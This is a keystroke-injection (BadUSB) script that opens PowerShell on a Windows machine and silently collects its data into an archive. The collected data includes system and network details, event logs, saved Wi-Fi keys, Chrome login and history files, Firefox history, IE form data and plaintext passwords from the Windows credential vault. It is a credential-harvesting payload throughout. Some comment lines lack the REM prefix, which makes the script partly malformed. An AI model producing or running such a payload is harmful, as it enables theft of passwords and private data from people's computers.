GUI r
DELAY 1000
STRING powershell
ENTER
DELAY 1000
REM Create and change to the \temp directory
STRING md \temp ; cd \temp
ENTER
DELAY 1000
REM Get system information
STRING Start-Process -NoNewWindow powershell -Args "systeminfo > systeminfo.txt"
ENTER
DELAY 500
REM Get IP configuration
STRING Start-Process -NoNewWindow powershell -Args "ipconfig /all > ipconfig.txt"
ENTER
DELAY 500
REM Get installed software
STRING Start-Process -NoNewWindow powershell -Args "gp HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | ft -AutoSize > installed_software.txt"
ENTER
DELAY 500
REM Get running processes
STRING Start-Process -NoNewWindow powershell -Args "gps | Select-Object ProcessName, Id, StartTime, CPU, VirtualMemorySize, Path | ft -AutoSize > running_processes.txt"
ENTER
DELAY 500
REM Get active network connections
STRING Start-Process -NoNewWindow powershell -Args "netstat -ano > netstat.txt"
ENTER
DELAY 500
REM Get Application event logs
STRING Start-Process -NoNewWindow powershell -Args "Get-EventLog -LogName Application -Newest 100 | ft TimeGenerated, EntryType, Source, InstanceId, Message -AutoSize -Wrap > eventlog_application.txt"
ENTER
DELAY 500
REM Get startup programs
STRING Start-Process -NoNewWindow powershell -Args "gcim Win32_StartupCommand | Select-Object Name, CommandLine, Location, User | ft -AutoSize > startup_programs.txt"
ENTER
DELAY 500
REM Get Windows services
STRING Start-Process -NoNewWindow powershell -Args "gsv | Select-Object Status, Name, DisplayName, StartType, ServiceType | ft -AutoSize > services.txt"
ENTER
DELAY 500
REM Get disk usage
STRING Start-Job {Get-PSDrive -PSProvider FileSystem | Select-Object Name, @{Name='Used (GB)';Expression={[math]::Round(($_.Used / 1GB), 2)}}, @{Name='Free (GB)';Expression={[math]::Round(($_.Free / 1GB), 2)}}, @{Name='Size (GB)';Expression={[math]::Round((($_.Used + $_.Free) / 1GB), 2)}}, @{Name='PercentageFree';Expression={[math]::Round((($_.Free / ($_.Used + $_.Free)) * 100), 2)}} | ft -AutoSize > C:\temp\disk_usage.txt}
ENTER
DELAY 500
REM Get Wi-Fi SSID and password
STRING Start-Process -NoNewWindow powershell -Args "& {netsh wlan show profiles | Select-String -Pattern 'All User Profile\s+:\s(.+)' | ForEach-Object { $profileName = $_.Matches.Groups[1].Value.Trim(); $network = netsh wlan show profile name=`"$profileName`" keyMaterial | Select-String -Pattern 'SSID name\s+:\s(.+)', 'Key Material\s+:\s(.+)'; if ($network) { $network | Out-File -Append wifi_info.txt } }}"
ENTER
DELAY 500
REM Get System event logs and zip files after completion
STRING Start-Process -NoNewWindow powershell -Args {Get-EventLog -LogName System -Newest 100 | ft TimeGenerated, EntryType, Source, InstanceId, Message -AutoSize -Wrap > eventlog_system.txt}
ENTER
DELAY 1000
REM Collect user and group permissions and output to a file.
STRING $groups = 'Administrators', 'Remote Desktop Users', 'Users', 'Guests'; foreach ($group in $groups) {echo $group >> C:\temp\users_and_permissions.txt ;Get-LocalGroupMember -Group $group | Select-Object Name, PrincipalSource >> C:\temp\users_and_permissions.txt}
ENTER
DELAY 500
Get Windows security event logs with ID 4624 and output to a file
STRING Start-Process -NoNewWindow powershell.exe -Args "Get-WinEvent -FilterHashtable @{LogName='Security'; Id='4624'} | Select-Object TimeCreated, Id, MachineName, Message | ft -AutoSize > security_events.txt"
ENTER
DELAY 500
Copy Chrome browser history to a file
STRING Start-Process -NoNewWindow powershell.exe -Args "cp 'C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\History' ./Chrome_History"
ENTER
DELAY 500
Copy Chrome browser login data to a file
STRING Start-Process -NoNewWindow powershell.exe -Args "cp 'C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Login Data' ./Chrome_Logins"
ENTER
DELAY 500
Find recently modified documents in the user's Documents folder and output to a file
STRING Get-ChildItem -Path 'C:\Users\*\Documents' -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.LastWriteTime -ge [DateTime]::Now.AddDays(-30)} | Select-Object FullName, LastWriteTime, Length | ft -AutoSize > recent_documents.txt
ENTER
DELAY 500
Copy Firefox browser history to a file
STRING Start-Process -NoNewWindow powershell.exe -Args "cp 'C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\*\places.sqlite' ./firefox_history.txt"
ENTER
Get Internet Explorer's stored form data and output to a file
STRING Get-ItemProperty -Path "HKCU:\Software\Microsoft\Internet Explorer\IntelliForms\Storage2" | Select-Object Property, Value
ENTER
DELAY 500
Get all stored browser passwords and output to a file
STRING [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];$vault = New-Object Windows.Security.Credentials.PasswordVault;$vault.RetrieveAll() | % { $_.RetrievePassword();$_ } | select username,resource,password >> ./BrowserCredentials.txt
ENTER
DELAY 500
List scheduled tasks and output to a file
STRING Get-ScheduledTask | Select-Object TaskName, TaskPath, State, LastRunTime, NextRunTime, Enabled, @{Name="LastResult";Expression={$_.LastTaskResult}}, Description | Format-Table -AutoSize >> C:\temp\Scheduled_Tasks.txt}
ENTER
DELAY 1000
List enabled firewall rules and output to a file
STRING Get-NetFirewallRule | Where-Object {$_.Enabled -eq 'True'} | Select-Object DisplayName, Enabled, Action, Direction, Protocol, LocalAddress, LocalPort, RemoteAddress, RemotePort | Format-Table -AutoSize > Firewall_Rules.txt
ENTER
DELAY 1000
Get firewall profile status and output to a file
STRING Get-NetFirewallProfile | Select-Object Name,Enabled,DefaultInboundAction,DefaultOutboundAction | Format-Table -AutoSize > firewall_status.txt
ENTER
DELAY 5000
Compress collected data files into a ZIP archive
STRING Start-Process -NoNewWindow powershell -Args "Compress-Archive -Path *.txt -DestinationPath .\collected_data.zip"
ENTER
STRING exit
ENTER
